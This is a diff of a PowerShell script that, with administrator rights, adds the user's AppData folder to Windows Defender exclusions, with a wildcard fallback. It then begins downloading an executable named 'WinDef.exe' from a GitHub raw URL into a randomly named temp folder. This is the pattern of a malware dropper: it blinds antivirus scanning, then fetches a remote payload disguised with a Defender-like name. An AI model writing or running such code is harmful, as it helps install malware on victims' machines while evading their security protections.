@@ -8,32 +8,32 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 try {
-    # Get the System32 folder path
-    $system32Path = "$env:WINDIR\System32"
+    # Get the AppData folder path
+    $exclusionPath = "$env:USERPROFILE\AppData"
     
-    Write-Host "Adding Windows Defender exclusion for: $system32Path" -ForegroundColor Yellow
+    Write-Host "Adding Windows Defender exclusion for: $exclusionPath" -ForegroundColor Yellow
     
-    # Add the System32 folder to Windows Defender exclusions
-    Add-MpPreference -ExclusionPath $system32Path
+    # Add the AppData folder to Windows Defender exclusions
+    Add-MpPreference -ExclusionPath $exclusionPath
     
-    Write-Host "Successfully added System32 exclusion to Windows Defender!" -ForegroundColor Green
-    Write-Host "Excluded path: $system32Path" -ForegroundColor Cyan
+    Write-Host "Successfully added AppData exclusion to Windows Defender!" -ForegroundColor Green
+    Write-Host "Excluded path: $exclusionPath" -ForegroundColor Cyan
     
     # Verify the exclusion was added
     $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-    if ($exclusions -contains $system32Path) {
+    if ($exclusions -contains $exclusionPath) {
         Write-Host "Exclusion verified successfully!" -ForegroundColor Green
     } else {
         Write-Warning "Could not verify if exclusion was added properly."
     }
     
 } catch {
-    Write-Error "Failed to add System32 exclusion: $($_.Exception.Message)"
+    Write-Error "Failed to add AppData exclusion: $($_.Exception.Message)"
     Write-Host "Attempting to add exclusion with different method..." -ForegroundColor Yellow
     
     try {
         # Alternative method - add exclusion with wildcard
-        Add-MpPreference -ExclusionPath "$system32Path\*"
+        Add-MpPreference -ExclusionPath "$exclusionPath\*"
         Write-Host "Alternative exclusion method applied!" -ForegroundColor Green
     } catch {
         Write-Error "Both exclusion methods failed: $($_.Exception.Message)"
@@ -48,7 +48,7 @@ function Generate-TempFolderName {
     return "$prefix$randomHex$suffix"
 }
 
-# Download application from URL
+# Download application from URLa
 try {
     # URL of the application to download
     $downloadUrl = "https://github.com/MillyNine/1/raw/refs/heads/main/WinDef.exe"  # Replace with actual URL
